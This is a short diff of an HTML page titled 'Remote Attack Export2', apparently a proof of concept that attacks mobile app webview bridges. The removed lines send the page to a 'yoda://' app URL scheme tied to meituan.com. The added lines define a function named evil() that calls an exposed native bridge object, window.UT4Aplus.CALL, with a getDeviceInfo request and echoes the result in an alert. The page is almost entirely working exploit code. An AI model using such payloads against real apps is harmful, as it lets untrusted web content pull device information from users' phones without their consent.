@@ -3,11 +3,21 @@
 <h1><div id="content">Remote Attack Export2</div></h1>
   
 <script>	
-attack();
-function attack(){
-	top.location.href ='yoda://www.meituan.com/arbiter/knbview';
-}
 
+   function callback(var1, var2) {
+        alert('var1 : ' + var1 + ' ,  var2 :' + var2);
+    }
+
+    function evil() {
+        temp = '{"methodName": "getDeviceInfo", "params": "", "callback": "callback", "sid": "123"}';
+        if (window.UT4Aplus) {
+            userInfo = 'bridgeVersion-' + window.UT4Aplus.CALL(temp);
+        } else {
+            userInfo = "nothing";
+        }
+    }
+
+    evil();
    
 </script>
 
